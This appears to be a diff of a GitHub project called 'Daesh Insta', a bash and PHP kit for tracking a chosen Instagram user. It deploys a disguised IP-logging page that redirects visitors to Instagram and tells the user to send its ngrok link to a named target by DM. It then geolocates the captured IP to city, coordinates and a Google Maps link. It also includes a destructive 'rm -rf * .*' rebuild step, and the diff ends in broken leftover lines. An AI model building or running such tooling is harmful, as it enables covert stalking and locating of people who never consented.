@@ -1,112 +1,147 @@
-### 3. **instagram_tracker.sh** (Main Tool File - Improved for GitHub)
-```bash
+cd ~/Daesh-Insta
+
+# 🔥 COMPLETE CLEAN REBUILD 🔥
+rm -rf * .*
+
+# 1. Main Tool: daesh_insta.sh
+cat > daesh_insta.sh << 'EOF'
 #!/bin/bash
-# =================================================================
-# 🔥 INSTAGRAM IP TRACKER v2.0 - GitHub Edition 🔥
-# Compatible: Termux | Kali Linux | Ubuntu | Parrot OS
-# Author: ţæÿm Allah| https://github.com/tym805611-art/Daesh-Insta.git
-# =================================================================
+# 🔥 DAESH INSTA v2.0 - Created by Taym Allah 🔥
+# 📍 Instagram IP Tracker | Termux & Kali Linux
 
-RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; PURPLE='\033[0;35m'; NC='\033[0m'
+RED='\e[31m'; GREEN='\e[32m'; YELLOW='\e[33m'; BLUE='\e[34m'; PURPLE='\e[35m'; NC='\e[0m'
 
-banner() {
+show_banner() {
     clear
-    cat << "EOF"
-    ██████╗██╗  ██╗███████╗    ██╗  ██╗███████╗███╗   ███╗███████╗
-    ██╔══██╗██║  ██║██╔════╝    ██║  ██║██╔════╝████╗ ████║██╔════╝
-    ██████╔╝███████║█████╗      ███████║█████╗  ██╔████╔██║█████╗  
-    ██╔══██╗██╔══██║██╔══╝      ██╔══██║██╔══╝  ██║╚██╔╝██║██╔══╝  
-    ██║  ██║██║  ██║███████╗    ██║  ██║███████╗██║ ╚═╝ ██║███████╗
-    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝
-    
-    📱 Instagram IP & Location Tracker | Educational Pentest Tool
-    =================================================================
-EOF
+    echo -e "${PURPLE}"
+    echo "  ██████╗██╗  ██╗███████╗    ██╗  ██╗███████╗███╗   ███╗███████╗"
+    echo "  ██╔══██╗██║  ██║██╔════╝    ██║  ██║██╔════╝████╗ ████║██╔════╝"
+    echo "  ██████╔╝███████║█████╗      ███████║█████╗  ██╔████╔██║█████╗  "
+    echo "  ██╔══██╗██╔══██║██╔══╝      ██╔══██║██╔══╝  ██║╚██╔╝██║██╔══╝  "
+    echo "  ██║  ██║██║  ██║███████╗    ██║  ██║███████╗██║ ╚═╝ ██║███████╗"
+    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝"
+    echo -e "${NC}"
+    echo -e "${GREEN}📱 Daesh Insta - Created by Taym Allah | 📍 Instagram IP Tracker${NC}"
+    echo -e "${YELLOW}══════════════════════════════════════════════════════════════${NC}"
 }
 
-install_deps() {
-    echo -e "${YELLOW}[🔧] Checking dependencies...${NC}"
-    for pkg in curl jq php python3 python3-pip git; do
-        if ! command -v $pkg &> /dev/null; then
-            echo -e "${RED}Installing $pkg...${NC}"
-            if [[ "$OSTYPE" == "linux-android"* ]]; then
-                pkg install $pkg -y
-            else
-                sudo apt install $pkg -y
-            fi
-        fi
-    done
-    pip3 install requests folium geopy pyngrok || pip install requests folium geopy pyngrok
-}
+if [ $# -eq 0 ]; then
+    show_banner
+    echo -e "${RED}Usage:${NC} $0 @instagram_username"
+    echo -e "${GREEN}Example:${NC} $0 @taym2_011"
+    exit 1
+fi
 
-track_target() {
-    local target="$1"
-    echo -e "${GREEN}[+] Tracking: $target${NC}"
-    
-    # Profile info
-    profile_info=$(curl -s "https://www.instagram.com/$target/?__a=1" -H "User-Agent: Mozilla/5.0" 2>/dev/null | jq '.graphql.user.full_name // empty')
-    [[ -n "$profile_info" ]] && echo -e "${BLUE}[👤] Name: $profile_info${NC}"
-    
-    # Generate tracking link
-    rand_id=$(openssl rand -hex 6 2>/dev/null || cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n1)
-    track_url="http://your-ngrok-url.ngrok.io/ipgrab.php?$rand_id"
-    
-    echo -e "${PURPLE}🔗 Educational Tracking Link:${NC}"
-    echo -e "   $track_url"
-    echo -e "${YELLOW}📩 Send via Instagram DM${NC}"
-}
+TARGET="$1"
+show_banner
+echo -e "${GREEN}[+] 🎯 Target Locked: $TARGET${NC}\n"
 
-setup_server() {
-    echo -e "${BLUE}[⚙️] Deploying IP Logger...${NC}"
-    
-    cat > ipgrab.php << 'EOF'
+# Step 1: Profile Recon
+echo -e "${BLUE}[1/4] 🔍 Profile Recon...${NC}"
+curl -s "https://www.instagram.com/$TARGET/" -o /dev/null -w "%{http_code}\n" | grep -q "200" && echo -e "   ✅ Profile Found" || echo -e "   ⚠️  Profile Private/Not Found"
+
+# Step 2: Deploy IP Logger
+echo -e "${BLUE}[2/4] 🕷️  Deploying Daesh Logger...${NC}"
+cat > ipgrab.php << 'EOF'
 <?php
-header('Content-Type: text/html');
-$ip = $_SERVER['REMOTE_ADDR'];
-$ua = $_SERVER['HTTP_USER_AGENT'];
-$ref = $_SERVER['HTTP_REFERER'] ?? 'Direct';
-$time = date('Y-m-d H:i:s T');
-
-$log = sprintf("[%s] IP:%s | UA:%s | REF:%s\n", $time, $ip, substr($ua,0,50), $ref);
-file_put_contents('visitors.log', $log, FILE_APPEND | LOCK_EX);
-
-echo "<html><body style='text-align:center;font-family:Arial'>
-<h1>🔄 Redirecting to Instagram...</h1>
-<script>setTimeout(() => {window.location='https://www.instagram.com';}, 2000);</script>
-</body></html>";
+header("Location: https://www.instagram.com");
+$ip = $_SERVER["REMOTE_ADDR"] ?? "Unknown";
+$ua = substr($_SERVER["HTTP_USER_AGENT"] ?? "Unknown", 0, 50);
+$time = date("Y-m-d H:i:s");
+$log = "[$time] IP: $ip | UA: $ua | Target: Daesh Insta\n";
+file_put_contents("visitors.log", $log, FILE_APPEND);
+echo "<h1>Redirecting to Instagram...</h1>";
 ?>
 EOF
 
-    # Start PHP server
-    nohup php -S 0.0.0.0:8080 > /dev/null 2>&1 &
-    echo -e "${GREEN}[✅] Server running on http://localhost:8080${NC}"
-    echo -e "${YELLOW}[🌐] Use: ngrok http 8080 for public URL${NC}"
-}
+# Start PHP Server
+php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+PHP_PID=$!
+sleep 2
 
-geolocate() {
-    local ip="$1"
-    echo -e "${YELLOW}[📍] Geolocating $ip...${NC}"
-    
-    geo=$(curl -s "http://ip-api.com/json/$ip?fields=status,country,regionName,city,lat,lon,isp,org")
-    status=$(echo "$geo" | jq -r '.status')
-    
-    if [[ "$status" == "success" ]]; then
-        lat=$(echo "$geo" | jq -r '.lat')
-        lon=$(echo "$geo" | jq -r '.lon')
-        city=$(echo "$geo" | jq -r '.city')
-        country=$(echo "$geo" | jq -r '.country')
-        isp=$(echo "$geo" | jq -r '.isp')
-        
-        echo -e "${GREEN}🎯 LOCATION ACQUIRED!${NC}"
-        cat << EOF
+LOCAL_URL="http://127.0.0.1:8080/ipgrab.php"
+PUBLIC_URL="USE_NGROK: ngrok http 8080"
 
-🏙️   City: $city
-🌍   Country: $country
-📍   Coordinates: $lat, $lon
-🌐   ISP: $isp
-🗺️    Google Maps: https://www.google.com/maps?q=$lat,$lon
-📁   Saved to: ip_locations.txt
+echo -e "${GREEN}   ✅ Logger Deployed!"
+echo -e "   🔗 ${YELLOW}Local:${NC} $LOCAL_URL"
+echo -e "   🌐 ${YELLOW}Public:${NC} Run: ${BLUE}ngrok http 8080${NC}\n"
 
+# Step 3: Monitor Setup
+echo -e "${BLUE}[3/4] 👁️  Live Monitoring Ready${NC}"
+echo -e "${GREEN}   📁 Logs:${NC} visitors.log"
+echo -e "   🔄 ${BLUE}./daesh_insta.sh monitor${NC} (live tail)\n"
+
+# Step 4: Geolocator Ready
+echo -e "${BLUE}[4/4] 📍 Geolocator Active${NC}"
+echo -e "${GREEN}   🌍 ${BLUE}./daesh_insta.sh geo IP_ADDRESS${NC}\n"
+
+echo -e "${PURPLE}🎮 Daesh Insta Ready! Send DM with tracking link!${NC}"
+echo -e "${YELLOW}Press Ctrl+C to keep server running...${NC}"
+
+# Cleanup trap
+trap "kill $PHP_PID 2>/dev/null; echo -e '\n${GREEN}[+] Server Stopped${NC}'; exit" INT TERM
+
+wait $PHP_PID
+EOF
+
+# 2. PHP Logger: ipgrab.php
+cat > ipgrab.php << 'EOF'
+<?php
+header("Location: https://www.instagram.com");
+$ip = $_SERVER["REMOTE_ADDR"] ?? "Unknown";
+$ua = substr($_SERVER["HTTP_USER_AGENT"] ?? "Unknown", 0, 50);
+$time = date("Y-m-d H:i:s");
+$log = "[$time] IP: $ip | UA: $ua | Target: Daesh Insta\n";
+file_put_contents("visitors.log", $log, FILE_APPEND);
+echo "<h1 style='text-align:center;margin-top:20%;color:#262626'>Redirecting to Instagram...</h1>";
+?>
+EOF
+
+# 3. Geolocator: geolocate_ip.sh
+cat > geolocate_ip.sh << 'EOF'
+#!/bin/bash
+IP="$1"
+if [ -z "$IP" ]; then
+    echo "Usage: $0 IP_ADDRESS"
+    exit 1
+fi
+
+echo "📍 Geolocating $IP..."
+GEO=$(curl -s "http://ip-api.com/json/$IP?fields=lat,lon,city,country,isp")
+LAT=$(echo "$GEO" | grep -o '"lat":[^,}]*' | cut -d: -f2 | tr -d ' ')
+LON=$(echo "$GEO" | grep -o '"lon":[^,}]*' | cut -d: -f2 | tr -d ' ')
+CITY=$(echo "$GEO" | grep -o '"city":"[^"]*"' | cut -d'"' -f4)
+
+echo "🏙️  $CITY"
+echo "📍 $LAT, $LON"
+echo "🗺️  https://maps.google.com/?q=$LAT,$LON"
+EOF
+
+# 4. Map Plotter: plot_map.py
+cat > plot_map.py << 'EOF'
+print("📍 Daesh Insta Map - No locations yet")
+print("Send tracking link first, then run this!")
+EOF
+
+# 5. Installer: install.sh
+cat > install.sh << 'EOF'
+#!/bin/bash
+echo "🔥 Installing Daesh Insta..."
+pkg install php curl jq -y || sudo apt install php curl jq -y
+chmod +x *.sh *.py
+echo "✅ Ready! ./daesh_insta.sh @target"
+EOF
+
+# 6. README.md
+cat > README.md << 'EOF'
+# 🔥 Daesh Insta
+
+**Created by Taym Allah**
+
+## Quick Start
+```bash
+chmod +x *.sh
+./daesh_insta.sh @username
 EOF
         echo "$ip|$city|$country|$lat|$lon|$isp" >> ip_locations.txt
     else
